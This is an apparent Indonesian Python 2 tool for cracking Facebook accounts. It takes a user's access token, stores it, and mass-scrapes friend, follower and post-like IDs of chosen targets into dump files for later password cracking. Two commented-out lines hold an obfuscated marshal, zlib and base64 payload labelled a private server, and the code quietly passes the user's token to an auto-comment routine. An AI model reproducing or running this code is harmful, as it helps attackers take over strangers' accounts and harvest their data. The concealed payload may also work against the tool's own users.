#!/usr/bin/python2
# coding=utf-8
#              YAYAN XD RISKY JEECK X NANO XNXCODE  
####################################################################
#      YOO FOLLOW YOO COOK OKH BEN OPEN SOURSE CODE MULU COOK      #
#                   https://github.com/mrjeeck                     #
#                          081392505882                                #
#       EDIT E OJO NEMEN NEMEN NGKO IDAMAN MU ILANG COOK OKEH      #
#     PLEASE FOLLOW SEMUA TEAM PROJECT SAYA OKH KARENA TANPA DIA   #
#TOOS INI TIADA MAKNANYA :) JADI HARGAI YAH MAAF KALO BERANTAKAN YA#
####################################################################

#########################################################################################################

# OMPEN SOURSE CODE YA BROO CUMA BOOT FOLLOW + BOT COMEN YANG ANE ENC 
# PENJELASAN DULU BROO HEHEHEHEHEHEHEHEHEHEHEHHEHEHEHEHEHEHEHEHEHHEEH
# JANGAN LUPA FOLLOW GH YAYAN,RISKY OKH SALAM DARI SAYA BUKAN DARI BINJAI :V
# WA : 081392505882
# FB : Jeeck X Nano
# GH : https://github.com/mrjeeck
# Thx: riskygantenk , YAYAN XD , XNXCODE , XXXCODE
# FOLLOW yayangantenk
# https://github.com/Yayan-XD
# FOLLOW riskygantenk DUMAII
# https://github.com/Dumai-991
# MAKASIH KEPADA yayangantenk riskygantenk 
# TANPA CUPLIKAN DIA TOOLS INI KAGAK ADA METHODE :(
# RECODE GPP ASAL CANTUMIN AUTHOR DAN TEAM SAYA YANG SUDAH BANTU
# TANPA CUPLIKAN DIA TOOLS INI KAGAK ADA METHODE MBASIC + MOBILE
# JANGAN LUPA DI FOLLOW YAH GITHUB DIA 
# TOOLS INI BERSIFAT TOOLS GABUNGAN OKH JANGAN DI PERJUAL BELIKAN
# MAKASIH YANG UDAH SUPPORT SAYA SAMPE SAAT INI
# MAKASIH ALL LOPEEEEEEEEEEEEEEEEEEEEEEEEEE ･ﾟﾟ･(>д<)･ﾟﾟ･
# RECODE NGOTAK DIKIT WEEE AKU MINTA IZIN SAMA MEREKA YANG BACA CUMA _@RISKY_ DOANK YANG FAST RESPON
# JADI BUAT KALIAN YANG BILANG AKU RECODE SETERAH DAHH MAKI MAKI JUGA GPP KOK 
# GPP INTINYA SAYA CUMA AMBIL CUPLIKAN DOANK OKHH SELAMAT MENCOBA ENJOOY 

##########################################################################################################
#
# HARGAI TOOLS SAYA YA BROO SAYA CARI EROR NYA SUSAH BANGET BUAT BETULIN MAAF KALO SAYA BANYAK SALAH
# DAN CODINGANNYA BERANTAKAN :) HEHEHEHE MAKASIH YAAA 😁 
import os
try:
    import requests
except ImportError:
    jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module requests belum terinstal")
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module futures belum terinstall")
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module bs4 belum terinstal")
    os.system('pip2 install bs4')
try:
    import ipaddress
except ImportError:
    jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Module ipaddress belum terinstal")
    os.system('pip2 install ipaddress')

import requests, os, re, bs4, sys, json, time, random, datetime, ipaddress
from concurrent.futures import ThreadPoolExecutor as JeckoloveAlmira
from datetime import datetime
from bs4 import BeautifulSoup
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')

P = '\033[0;36m' 
M = '\033[0;35m'
H = '\x1b[1;92m'
K = '\x1b[1;93m' 
B = '\033[0;00m'
U = '\x1b[1;95m' 
O = '\x1b[1;97m' 
N = '\033[0;00m'
p='\033[0;32m'
b='\033[0;36m'
j='\033[0;31m'
m='\033[0;35m'
f='\033[0;37m'
l='\033[0;33m'
p='\033[00m'
k='\033[0;90m'
x="\033[00m"                                                            #ALMIRA LOVE JEECK X NANO           
jeeck_warna = [
N,O,U,B,K,H,M,P,p,b,m] # Warna untuk pemanggilan %s ( N ) Kontoll
warna = random.choice(jeeck_warna)


ok = []
cp = []
id = []
user = []
loop = 0
#
def jeeck_love_almira(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


# Ini Untuk bemnerr
jeeck_banner = '''
\x1b[1;95m		____▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄_
\x1b[1;95m		───█▒▒░░░░░░░░░▒▒█───
\x1b[1;95m		────█░░█░░░░░█░░█────
\x1b[1;95m		─▄▄──█░░░▀█▀░░░█──▄▄─
\x1b[1;95m		█░░█─▀▄░░░░░░░▄▀─█░░█
\x1b[1;97m		█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\x1b[1;97m		█ \x1b[1;94m ╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗ \x1b[1;97m █
\x1b[1;97m		█ \x1b[1;94m ║║║╠─║─║─║║║║║╠  \x1b[1;97m █
\x1b[1;97m		█ \x1b[1;94m ╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝ \x1b[1;97m █
\x1b[1;97m		█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\x1b[1;94m✠═╦════════════════════════════════════════════════════✠
\x1b[1;94m  ║ \x1b[1;97m[1] \x1b[1;93mNC : Sanz-Tzy ╰_╯   \x1b[1;94m║ \x1b[1;97m[4] \x1b[1;93mXNXCODE TEAM ╰_╯
\x1b[1;94m  ║ \x1b[1;97m[2] \x1b[1;93mFB : Bintang Tzy     \x1b[1;94m║ \x1b[1;97m[5] \x1b[1;93mYAYAN XD╰_╯
\x1b[1;94m  ║ \x1b[1;97m[3] \x1b[1;93mWA : 08173xxxxx    \x1b[1;94m║ \x1b[1;97m[6] \x1b[1;93mRISKY GANTENK╰_╯
\x1b[1;94m✠══════════════════════════════════════════════════════✠
'''


def _jeckoramadhan_ganz_():
#    os.system('clear')
    os.system('clear')
    print ("  ______ ____   __ __ _______   __")
    print (" /_  __// __ \ / //_// ____/ | / /")
    print ("  / /  / / / // ,<  / __/ /  |/ / ")
    print (" / /  / /_/ // /| |/ /__ / /|  /  ")
    print ("/_/   \____//_/ |_/_____/_/ |_/   ")

    print '\n\x1b[1;94m✠═════════════════════════[ P A N D U A N ]════════════════════════════✠';time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m01\033[0;36m]\033[0;00m Pastikan anda menggunakan account tumball :V ");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m02\033[0;36m]\033[0;00m Alasan aink suruh pake account tumball apa cookk………?");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m03\033[0;36m]\033[0;00m Biar bisa ngamanin akun utama luu okhehhhhhh.....");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m04\033[0;36m]\033[0;00m Cara ambil [ TOKEN ] ketikan [ \033[0;36mMENU \033[0;00m] ");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m05\033[0;36m]\033[0;00m Ya di pelajari biar lu semakin gg jadi henkgkernya:V");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m06\033[0;36m]\033[0;00m Usahakan Ganti [ USER AGENT TERLEBIH DAHULU ]");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m07\033[0;36m]\033[0;00m Untuk cara pembukaan sesi ada di menu Okh ");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m08\033[0;36m]\033[0;00m + Setiap 5 menit / jika tidak.ada results ON OF MODD PESAWAT");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m09\033[0;36m]\033[0;00m JANGAN LUPA FOLLOW GITHUB SAYA DAN TEMEN SAYA OKH :)  ");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m10\033[0;36m]\033[0;00m JANGAN LUPA USAHAIN MODE PESAWAT JIKA TIDAK ADA RESULTS");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m11\033[0;36m]\033[0;00m SELAMAT MENCOBA OKH INI TOOLS UPDETAN : 2.00 DARI TOOLS SIMBF");time.sleep(0.03)
    print '\x1b[1;94m✠══════[ MASUKAN TOKEN OKEH SAINS BRO ]═══════✠\n';time.sleep(0.03)
    lalalalaganigani = raw_input('\n %s[%s+%s] %sToken :%s '%(B,P,B,P,H))
    if lalalalaganigani in ('menu', 'Menu', 'MENU'):
        jeeck_love_almira ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Usahakan di pengerti babi ........")
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Enter o arah e meng menu bosen boso indo ae")
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Ararakimochi Mbah selamet ketampol panci...")
        raw_input ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]")
        os.system('xdg-open https://youtu.be/p4MjQCD0ej4')
        _jeckoramadhan_ganz_()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(lalalalaganigani)).json()['name']
        print '\n\n %s[+]%s Selamat Datang %s%s%s'%(B,P,K,nama,N);time.sleep(2)
        
        open('.almiraXjeeck.txt', 'w').write(lalalalaganigani)
        raw_input(' %s[%s+%s]%s ENTER  '%(B,P,B,P));jeeck_bot_kom(lalalalaganigani)
        
        ___jeeck___xnano___xxz___()

# INI ADALAH SERVER PRIBADI UBAH SEDIKIT PALING EROR
#_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJylVltz20QUPvLdzq0ptE5Dm5pCMuYllizr4gwhTYHOUIZ0xnkAPMx4ZO1Glm1pjXYFDVOe4CfyzC/gR3B27dBGTTx0rLXOt/udi/as1nvkw+Iq4P0Ub/4XCgLQR6lBX4MAFj+Sg4sC/FSAfg76eehjpwi0BOMykDyQApAiBHn4A70qEK4DKQEpg00qQKoINSBrCMhvIGwC2UK4A2Qb4S6QDxA+BHIP4T6QOsIOkAcIu0A+QngI5BHY/aqaVU3JNSXXldxQclPJLSUx9B78iYlsA3kM59VmAxMTWygMXdfNtuU4Ztc2u5biLMfsWI6lO7prdrpGKJeES48fvThozBgXISJL5Ci+9BqBFwsaB0ef8V00Oo3HYSKuyMYQraho/EpHI/4Y1c/oqOF7yX9ejSCMvNhTdo2jpiijzQsvTr0kFDns64aoIDynw+QN1xZFhO+8hIo5YSridJaE0znREXlpQRcOlpDv9EUaL8b2YjxdjB313NMg5QJ/inJFFeGczgSNhjSZk11l93Ii2BVl6Gp+Z+yXN2bGfM5fUf4W1/Y1BNmVU/1Sruk/yFz+rb0G+F0DATDW5Nt6rcF93DjagshliXyWKGSJYpYoZYlylqhkiaok6m8RNcA86rhv6xnFeta1plxvsNzIWm6CUNlc5K7RWyBUTlKTz2qKt2pKcoY3asq3aiq3aqq3amq3atYymu/jMmiaFmvwAx4j5807cqfw5yhHQsz4UasVJN5sdHjh+XTI2OTQZ1Er85ds8XTI/STEjcRPPN+nnA8Em9D4eJ//n1C2aXd10zLNjr5qKN21HdfoGF3HWTmU5TquZZiOvnKCOqbWNtqOrndXDdUxTNc127plrzgrt93uurhMlm3qK6+VYeqm0bEtx7aXhvp2eajMsd6ahhPKT3gaRV5yeSySlB5ci8iP3y8echGNBW+dRBjEC+gx38QImaBPlwd1cd93u8bqu6LtWJaLl+Eu3/bfLA8V0dZFEtKYcMxKjBg5lvXvIA0JR++DbLRny6Pt8xtW6d0wzXVZnmUJSejPKeWCq3Iln6zqz4hR4cUTVeImbIQHEsCUDbDQxoIR5YjDMaX+ROlehYNxGM3C+JUqk6gLgiurmGJTUXHAU56qsod9n06xPOOhqkZDFjRl7RLyCJt684YlPJS3uCcnQuPBYP5QRKR/Q2jKbwcl+B6KFidY+0nr7GtsrbntkInBhEWHs0uxgSbXyLvSsSPdtbxW0rbfaQ8Wd13blS23O0dtD+3PmtK990gK9b0j588mCvyZgpCohZ0yNlOJ4icNYZHq+iMW+rT3UDrKFRmmUy8eCDHtyUR68lOm97EUT6T4RIpPpdiXonmV9fvlL1/J5xEj6ZR+IefAd1CUMPE9bUfra6Vr7V84qpQn', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
# RISKY RISKY RISKY JEECK JEECK JEECK YAYAN YAYAN YAYAN
    except KeyError:
        print '\n\n %s[%s+%s] %stoken invalid'%(B,P,B,P);time.sleep(2);_jeckoramadhan_ganz_()

# def_
    
def ___jeeck___xnano___xxz___():
    os.system('git pull')
    os.system('clear')
    try:
    	lalalalaganigani = open('.almiraXjeeck.txt', 'r').read()
    except IOError:
        print '\n %s[%s+%s] %stoken invalid'%(B,P,B,P);time.sleep(2);os.system('rm -rf .almiraXjeeck.txt');_jeckoramadhan_ganz_()
    try:
        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(lalalalaganigani)).json()['name']
    except KeyError:
        print '\n %s[%s+%s]%s token invalid'%(B,P,B,P);time.sleep(2);os.system('rm -rf .almiraXjeeck.txt');_jeckoramadhan_ganz_()
    except requests.exceptions.ConnectionError:
        exit('\n\n %s[%s+%s]%s tidak ada koneksi\n'%(B,P,B,P))
    os.system('clear')
    print jeeck_banner
    IP = requests.get('https://api.ipify.org/').text
    
    print '\x1b[1;94m✠═╦════════════════════════════════════════════════════✠';time.sleep(0.03)
    print '\x1b[1;94m  ║\x1b[1;97m YOUR NAME FB   :\x1b[1;93m %s'%(nama);time.sleep(0.03)
    print '\x1b[1;94m  ║\x1b[1;97m IP DEVICE      :\x1b[1;93m %s'%(IP)
    print '\x1b[1;94m  ║\x1b[1;97m SETATUS USER   :\x1b[1;93m ACTIVE'
    print '\x1b[1;94m  ║\x1b[1;97m TOOLS NICK     :\x1b[1;93m Theon ｡◕‿◕｡'
    print '\x1b[1;94m  ║\x1b[1;97m PROJECTED TEAM :\x1b[1;93m YAYAN XD , RISKY , XNXCODE╰_╯'
    print '\x1b[1;94m✠═║════════════════════════════════════════════════════✠\n';time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m01\033[0;36m]\x1b[1;97m Dump id public facebook");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m02\033[0;36m]\x1b[1;97m Dump id pertemanan facebook");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m03\033[0;36m]\x1b[1;97m Dump id followers facebook");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m04\033[0;36m]\x1b[1;97m Dump id reactionts post facebook");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m05\033[0;36m]\x1b[1;97m Get data target [ GET ]");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m06\033[0;36m]\x1b[1;92m Starts Cracking");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m07\033[0;36m]\x1b[1;97m Cek results crack ");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m08\033[0;36m]\x1b[1;97m Seting User agent");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m09\033[0;36m]\x1b[1;97m Projected Team   ");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m10\033[0;36m]\x1b[1;97m TUTOR BUKAK SESI");time.sleep(0.03)
    print ( " \033[0;36m[\033[0;35m00\033[0;36m]\x1b[1;91m Deleted [ TOKEN ]");time.sleep(0.03)
    ___jeeck___X___almira___cans___ = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Menu : ")
    if ___jeeck___X___almira___cans___ == '':
        print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Isi dengan benar kawan");time.sleep(2);___jeeck___xnano___xxz___()
    elif ___jeeck___X___almira___cans___ in['2','02']:
        ___jeeck___lope___almira___(lalalalaganigani)
    elif ___jeeck___X___almira___cans___ in['1','01']:
        ___jeeck___sayang___almira___publickkkk___(lalalalaganigani)
    elif ___jeeck___X___almira___cans___ in['3','03']:
        ___jeeck___lope___almira___canz___(lalalalaganigani)
    elif ___jeeck___X___almira___cans___ in['4','04']:
        ___jeeck___sayang___almira___postinganngentodbokep___(lalalalaganigani)
    elif ___jeeck___X___almira___cans___ in['6','06']:
        ___jeeck___run___().___almira___cans___()
    elif ___jeeck___X___almira___cans___ in['5','05']:
        ___jeeck___sayang___almira___inpocook___(lalalalaganigani)
    elif ___jeeck___X___almira___cans___ in['10','10']:
       ___jeeck___bukaksesi___()
    elif ___jeeck___X___almira___cans___ in['7','07']:
        try:
            dirs = os.listdir("results")
            print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ RESULTS Cracking ]")
            for file in dirs:
                print(" [%s+%s] %s"%(B,P,file))
            file = raw_input ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan file : ")
            if file == "":
                file = raw_input ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan file :")
            total = open("results/%s"%(file)).read().splitlines()
            print ('\n\x1b[1;94m✠══════════════════════[ ALMIRA CANZ ]══════════════════════✠\n');time.sleep(0.03);time.sleep(2)
            nm_file = ("%s"%(file)).replace("-", " ")
            hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
            jeeck_love_almira(" [%s*%s] Hasil %sCracking%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(B,P,B,P,K,O,hps_nm,B,P,O,len(total),O))
            print '\n\x1b[1;94m✠══════════════════════[ ALMIRA CANZ ]══════════════════════✠\n';time.sleep(2)
            for almiraXjeeck in total:
            	lalalalaganigani = almiraXjeeck.replace("\n","")
                yangzzz___  = lalalalaganigani.replace(" (s) "," \x1b[0m[\x1b[1;92m√\x1b[0m]\x1b[1;92m ").replace(" (c) ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
                print("%s%s"%(yangzzz___,N));time.sleep(0.03)
            print '\n\x1b[1;94m✠══════════════════════[ ALMIRA CANZ ]══════════════════════✠\n'
            
            raw_input ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m[ ENTER ] ");___jeeck___xnano___xxz___()
        except (IOError):
            print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Apakah lu dah Cracking kok nggak ada hasil")
            raw_inputt ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()
    elif ___jeeck___X___almira___cans___ in['8','08']:
        seting_jeeckxxz()
    elif ___jeeck___X___almira___cans___ in['9','09']:
        ___jeeck___sayang___almira___inpocookkkk___()
    elif ___jeeck___X___almira___cans___ in['0','00']:
        print '\n'
        yanganz___()
        time.sleep(1);os.system('rm -rf .almiraXjeeck.txt')
        print ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m  Berhasil ");exit()
    else:
        print '\n %s[%s+%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(B,P,B,P,___jeeck___X___almira___cans___,N);time.sleep(2);___jeeck___xnano___xxz___()



# INI ADALAH SERVER PRIBADI UBAH SEDIKIT PALING EROR
#_=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJylVltz20QUPvLdzq0ptE5Dm5pCMuYllizr4gwhTYHOUIZ0xnkAPMx4ZO1Glm1pjXYFDVOe4CfyzC/gR3B27dBGTTx0rLXOt/udi/as1nvkw+Iq4P0Ub/4XCgLQR6lBX4MAFj+Sg4sC/FSAfg76eehjpwi0BOMykDyQApAiBHn4A70qEK4DKQEpg00qQKoINSBrCMhvIGwC2UK4A2Qb4S6QDxA+BHIP4T6QOsIOkAcIu0A+QngI5BHY/aqaVU3JNSXXldxQclPJLSUx9B78iYlsA3kM59VmAxMTWygMXdfNtuU4Ztc2u5biLMfsWI6lO7prdrpGKJeES48fvThozBgXISJL5Ci+9BqBFwsaB0ef8V00Oo3HYSKuyMYQraho/EpHI/4Y1c/oqOF7yX9ejSCMvNhTdo2jpiijzQsvTr0kFDns64aoIDynw+QN1xZFhO+8hIo5YSridJaE0znREXlpQRcOlpDv9EUaL8b2YjxdjB313NMg5QJ/inJFFeGczgSNhjSZk11l93Ii2BVl6Gp+Z+yXN2bGfM5fUf4W1/Y1BNmVU/1Sruk/yFz+rb0G+F0DATDW5Nt6rcF93DjagshliXyWKGSJYpYoZYlylqhkiaok6m8RNcA86rhv6xnFeta1plxvsNzIWm6CUNlc5K7RWyBUTlKTz2qKt2pKcoY3asq3aiq3aqq3amq3atYymu/jMmiaFmvwAx4j5807cqfw5yhHQsz4UasVJN5sdHjh+XTI2OTQZ1Er85ds8XTI/STEjcRPPN+nnA8Em9D4eJ//n1C2aXd10zLNjr5qKN21HdfoGF3HWTmU5TquZZiOvnKCOqbWNtqOrndXDdUxTNc127plrzgrt93uurhMlm3qK6+VYeqm0bEtx7aXhvp2eajMsd6ahhPKT3gaRV5yeSySlB5ci8iP3y8echGNBW+dRBjEC+gx38QImaBPlwd1cd93u8bqu6LtWJaLl+Eu3/bfLA8V0dZFEtKYcMxKjBg5lvXvIA0JR++DbLRny6Pt8xtW6d0wzXVZnmUJSejPKeWCq3Iln6zqz4hR4cUTVeImbIQHEsCUDbDQxoIR5YjDMaX+ROlehYNxGM3C+JUqk6gLgiurmGJTUXHAU56qsod9n06xPOOhqkZDFjRl7RLyCJt684YlPJS3uCcnQuPBYP5QRKR/Q2jKbwcl+B6KFidY+0nr7GtsrbntkInBhEWHs0uxgSbXyLvSsSPdtbxW0rbfaQ8Wd13blS23O0dtD+3PmtK990gK9b0j588mCvyZgpCohZ0yNlOJ4icNYZHq+iMW+rT3UDrKFRmmUy8eCDHtyUR68lOm97EUT6T4RIpPpdiXonmV9fvlL1/J5xEj6ZR+IefAd1CUMPE9bUfra6Vr7V84qpQn', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'lambda.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
# RISKY RISKY RISKY JEECK JEECK JEECK YAYAN YAYAN YAYAN


def ___jeeck___lope___almira___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        jck = raw_input ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama File : ")
        jcko = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maxs id : ")
        ___jeeck___sayang___almira___ = ('dump/' + jck + '.json').replace(' ', '_')
        jecko  = open(___jeeck___sayang___almira___, 'w')
        for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(jcko,lalalalaganigani)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            jecko.write(a['id'] + '<=>' + a['name'] + '\n')
            

        jecko.close()
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Detected dump id maxs \033[0;00m100+\033[0;33m.........")
        jeeck_love_almira ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Detected sucses dump id......:)")
        print ' [%s+%s] Tersimpan Di file ( %s%s%s )'%(B,P,B,___jeeck___sayang___almira___,N)
        print 50 * '═'
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ] ");___jeeck___xnano___xxz___()
    except (KeyError,IOError):
        os.remove(___jeeck___sayang___almira___)
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal dump id mungkin id tersebut privat")
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()
'''
																																																				almr = '___jeeck___sayang___almira___dy sayang Ya___jeeck___'
																																										'''

def ___jeeck___sayang___almira___publickkkk___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        almr = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan id : ")
        almirah = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ")
        ihh = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maxs id : ")
        knt = ('dump/' + almirah + '.json').replace(' ', '_')
        jecko  = open(knt, 'w')
        for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(almr,ihh,lalalalaganigani)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            jecko.write(a['id'] + '<=>' + a['name'] + '\n')



        jecko.close()
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Detected dump id maxs \033[0;00m100+\033[0;33m.........")
        jeeck_love_almira ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Detected sucses dump id......:)")
        print ' [%s+%s] Tersimpan Di file ( %s%s%s )'%(B,P,B,knt,N)
        print 50 * '═'
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()
    except (KeyError,IOError):
        os.remove(knt)
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Gagal dump id mungkin id perivat")
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()


def yanganz___():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ','\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s+%s]%s menghapus token %s'%(B, P, B, P, x), 
        sys.stdout.flush()
        time.sleep(1)

def ___jeeck___lope___almira___canz___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        almr = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan id : ")
        jck = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama file : ")
        jcko = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maxs id : ")
        almira  = ('dump/' + jck + '.json').replace(' ', '_')
        jecko  = open(almira, 'w')
        for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(almr,jcko,lalalalaganigani)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            jecko.write(a['id'] + '<=>' + a['name'] + '\n')


        jecko.close()

        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Detected dump id maxs \033[0;00m100+\033[0;33m.........")
        jeeck_love_almira ( "\n \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Detected sucses dump id......:)")
        print ' [%s+%s] Tersimpan Di file ( %s%s%s )'%(B,P,B,almira,N)
        print 50 * '═'
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()
    except (KeyError,IOError):
        os.remove(almira)
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Dump id gagal mungkin id perivat")
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()


def ___jeeck___sayang___almira___postinganngentodbokep___(lalalalaganigani):
    try:
        os.mkdir('dump')
    except:pass
    try:
        almr = raw_input ( " \n\033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Masukan id : ")
        ppk = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Nama File : ")
        jcko = raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Maxs id : ")
        almirah = ('dump/' + ppk + '.json').replace(' ', '_')
        jecko  = open(almirah, 'w')
        for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(almr,jcko,lalalalaganigani)).json()["data"]:
            id.append(a['id'] + '<=>' + a['name'])
            jecko.write(a['id'] + '<=>' + a['name'] + '\n')


        jecko.close()
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;33m Detected dump id maxs \033[0;00m100+\033[0;33m.........")
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Detected Dump like post")
        print ' [%s+%s] Tersimpan Di file ( %s%s%s )'%(B,P,B,almirah,N)
        print 50 * '═'
        raw_input ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m [ ENTER ]");___jeeck___xnano___xxz___()
    except (KeyError,IOError):
        os.remove(almirah)
        jeeck_love_almira ( " \033[0;36m[\033[0;35m+\033[0;36m]\033[0;00m Dump id gagal mungkin id privat")
